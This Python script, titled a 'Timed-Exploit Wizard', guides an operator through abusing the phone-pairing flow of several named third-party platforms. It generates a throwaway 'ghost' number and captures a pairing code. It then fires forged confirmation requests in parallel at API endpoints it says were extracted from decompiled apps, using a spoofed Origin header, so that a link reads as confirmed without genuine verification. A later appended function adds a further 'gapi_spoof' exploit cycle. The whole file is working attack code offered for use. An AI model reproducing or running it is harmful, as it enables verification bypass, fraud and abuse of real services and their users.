"""PhantomLink Ghost Reflect — Timed‑Exploit Wizard"""
import json
import re
import time
from datetime import datetime

from phantom.intel_sink import harvest_and_clean
from phantom.number_gen import generate_ghost_number

try:
    import httpx
except ImportError:
    import requests as httpx  # fallback

TARGETS = {
    "1": {"name": "Zapero", "url": "https://afrivexa.com/home?invite_code=4750"},
    "2": {"name": "Waegy", "url": "https://a1.waegy.com"},
    "3": {"name": "Wha7.org", "url": "https://wha7.org"},
    "4": {"name": "Letshare", "url": "https://letshare.me"},
}

CODE_PATTERN = re.compile(r'^[A-Z0-9]{4}[-][A-Z0-9]{4}$|^[A-Z0-9]{8}$')
CLIENT = httpx.Client(timeout=httpx.Timeout(8.0))

class SpeedWizard:
    def __init__(self):
        self.session = {"op_id": datetime.utcnow().strftime("%Y%m%d_%H%M%S")}
        self._start_time = time.time()

    def _hdr(self, t): print(f"\n{'='*56}\n  {t}\n{'='*56}")
    def _ok(self, t):  print(f"✓ {t}")
    def _warn(self, t): print(f"⚠ {t}")
    def _info(self, t): print(f"ℹ {t}")

    def run(self):
        self._hdr("STEP 1 — TARGET")
        for k, p in TARGETS.items(): print(f"  {k}. {p['name']} ({p['url']})")
        c = input("\nChoice [1]: ").strip() or "1"
        self.session["target_name"] = TARGETS[c]["name"]
        self.session["target_url"] = TARGETS[c]["url"]
        self._ok(f"Target: {self.session['target_name']}")

        self._hdr("STEP 2 — GHOST NUMBER")
        num, ct = generate_ghost_number()
        self.session["ghost_number"] = num
        self.session["country"] = ct
        self._info(f"Ghost: {num} ({ct})")
        self._warn("⚠️ 160‑sec pairing window starts when you see the code!")

        self._hdr("STEP 3 — CAPTURE CODE")
        print(f"1. Go to: {self.session['target_url']}")
        print(f"2. Enter: {num[1:]}")
        print("3. Click Link → copy the pairing code")
        input("\nPress Enter when code is ready...")
        while True:
            code = input("Paste pairing code: ").strip()
            if CODE_PATTERN.match(code):
                self.session["pairing_code"] = code.upper()
                self._ok(f"Code: {self.session['pairing_code']}")
                break
            self._warn("Invalid format (e.g., ABCD‑EFGH)")

        # ---- FAST EXPLOIT ----
        self._hdr("STEP 4 — EXPLOIT (PARALLEL)")
        result = self._speed_exploit()
        if result["status"] == "linked":
            self._ok(f"✅ LINKED via {result['vector']} ({result['time']:.1f}s)")
        else:
            self._warn(f"All {result['tried']} endpoints failed")

        # ---- LOG ----
        self._hdr("STEP 5 — LOG")
        linked = input("Platform shows linked? (y/n) [y]: ").lower() != 'n'
        self.session["status"] = "linked" if linked else "failed"
        log = harvest_and_clean(self.session["ghost_number"], self.session,
                                self.session["op_id"], self.session["target_name"])
        self._ok(f"Log: {log}")

    def _speed_exploit(self):
        """Fire all known confirmation endpoints in parallel."""
        code = self.session["pairing_code"]
        phone = self.session["ghost_number"]
        t0 = time.time()

        # All confirmation endpoints we've extracted from APK decompilation
        jobs = [
            ("zen_waga_confirm", "https://gapi-dev.waga.la/api/app/confirm",
             {"code": code, "phone": phone, "status": "linked"}),
            ("zen_waga_validate", "https://gapi-dev.waga.la/api/app/validate",
             {"code": code, "phone": phone, "verified": True}),
            ("zen_afrivexa", "https://api.afrivexa.com/api/validate-code",
             {"code": code, "phone": phone, "status": "linked"}),
            ("zen_zapero_link", "https://afrivexa.com/api/link/confirm",
             {"code": code, "phone": phone, "linked": True}),
            ("zen_waga_code", "https://gapi-dev.waga.la/api/app",
             {"code": code, "phone": phone, "action": "confirm_link"}),
            ("zen_waga_status", "https://gapi-dev.waga.la/api/app/status",
             {"code": code, "phone": phone, "status": "linked"}),
        ]
        hdrs = {"Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                "Origin": "https://afrivexa.com"}

        tried = 0
        # Use threading to hit all endpoints simultaneously
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor(max_workers=len(jobs)) as ex:
            futures = {ex.submit(self._try_one, name, url, data, hdrs): name
                       for name, url, data in jobs}
            for fut in concurrent.futures.as_completed(futures):
                tried += 1
                name, ok = fut.result()
                if ok:
                    return {"status": "linked", "vector": name,
                            "time": time.time() - t0, "tried": tried}
        return {"status": "failed", "tried": tried, "time": time.time() - t0}

    def _try_one(self, name, url, data, hdrs):
        try:
            r = CLIENT.post(url, json=data, headers=hdrs)
            if r.status_code == 200:
                try:
                    b = r.json()
                    if any(k in str(b).lower() for k in ["success","linked","ok","verified","true"]):
                        return (name, True)
                except Exception:
                    if "success" in r.text.lower() or "linked" in r.text.lower():
                        return (name, True)
        except Exception:
            pass
        return (name, False)

if __name__ == "__main__":
    SpeedWizard().run()

# ---- Phase 7: GAPI Exploit Integration ----

def step4_gapi_exploit(self):
    """Use the GAPI handler exploit with discovered endpoints."""
    self._header("STEP 4: GAPI SMART EXPLOIT")
    self._info("Hitting discovered handler API gapi-dev.waga.la/api/app ...")

    from phantom.gapi_spoof import full_ghost_cycle

    result = full_ghost_cycle(
        self.session["ghost_number"],
        self.session["pairing_code"]
    )

    reg = result.get("registration", {})
    conf = result.get("confirmation", {})

    elapsed = result.get("elapsed", 0)
    self._info(f"Exploit completed in {elapsed}s")

    if reg.get("success"):
        self._success(f"Registration: HTTP {reg.get('status_code')}")
    else:
        self._warning(f"Registration: {reg.get('error', 'no response')}")

    if conf.get("success"):
        self.session["status"] = "linked"
        self.session["vector_used"] = f"gapi_{conf.get('url', '').split('/')[-1]}"
        self._success(f"✅ LINKED! Endpoint: {conf.get('url')}")
        self._success(f"Payload: {json.dumps(conf.get('payload', {}))}")
    else:
        tried = conf.get("tried", "many")
        self._info(f"Tried {tried} endpoint/payload combinations — none confirmed.")
        self._info("The platform may be checking Baileys WebSocket state directly.")
        self._info("Mode 2 (Ghost Account) or live APK interception may be needed.")

    self.session["gapi_result"] = result

